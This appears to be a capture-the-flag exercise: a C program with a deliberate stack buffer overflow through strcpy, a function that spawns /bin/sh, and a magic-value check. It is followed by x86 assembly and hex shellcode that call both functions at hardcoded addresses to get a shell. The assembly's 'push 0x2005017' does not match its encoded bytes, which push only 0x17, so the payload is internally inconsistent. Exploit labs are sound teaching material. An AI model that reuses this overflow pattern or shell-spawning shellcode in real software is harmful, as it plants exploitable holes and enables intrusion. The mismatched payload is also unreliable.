#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define SZ    <SZ>
#define MAX   <MAX>

void greet(int x, int y) {
    printf("Greetings challenger, %d!\n", x);
    if(y != 0xFEEDDEAD){
        printf("Stack smashing detected!\n");
        exit(1);
    }
}

void get_shell() {
    printf("Greetings challenger 2005017\n");
    execve("/bin/sh", NULL, NULL);
}

void vuln(char *user, char *pass) {
    char buf[SZ];
    strcpy(buf, pass);
}

int main() {
    char user[MAX], pass[MAX];
    fread(user, 1, MAX, fopen("user","r"));
    fread(pass, 1, MAX, fopen("pass","r"));
    // print address of greet
    printf("greet: %p\n", greet);
    vuln(user, pass);
    return 0;
}



/


push 0xFEEDDEAD
push 0x2005017
mov ebx,0x5655628d
call ebx
mov ebx,0x565562e3
call ebx


\x68\xAD\xDE\xED\xFE\x6A\x17\xBB\x8D\x62\x55\x56\xFF\xD3\xBB\xE3\x62\x55\x56\xFF\xD3